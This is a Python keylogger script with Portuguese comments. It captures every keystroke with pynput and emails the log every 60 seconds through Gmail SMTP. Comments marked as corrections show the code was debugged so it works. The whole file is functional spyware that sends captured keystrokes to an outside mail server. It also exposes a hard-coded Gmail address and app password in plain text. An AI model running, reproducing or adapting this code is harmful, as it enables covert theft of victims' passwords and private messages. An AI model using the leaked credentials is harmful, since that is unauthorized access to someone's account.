from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações
EMAIL_ORIGEM = "psicoifesc.hidrolandia@gmail.com"
EMAIL_DESTINO = "psicoifesc.hidrolandia@gmail.com" 
SENHA = "zatc sztb faws lgik" # Certifique-se de que esta é a "Senha de App"

log = "" # Inicializando a variável global

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            # CORREÇÃO 1: Variável era SENHA, não SENHA_EMAIL
            server.login(EMAIL_ORIGEM, SENHA) 
            server.send_message(msg)
            print("Email enviado com sucesso!")
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar: {e}")
        
        log = "" # Limpa o log após enviar

    # CORREÇÃO 2: O Timer deve ficar fora do 'if log' para continuar rodando mesmo se não houver texto
    Timer(60, enviar_email).start()

# CORREÇÃO 3: A função on_press deve ficar FORA da enviar_email
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            # CORREÇÃO 4: Usar += para adicionar a marcação, não = (que apagaria o log)
            log += "[<]"

# Iniciar o ciclo de envio e o listener
enviar_email() 
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
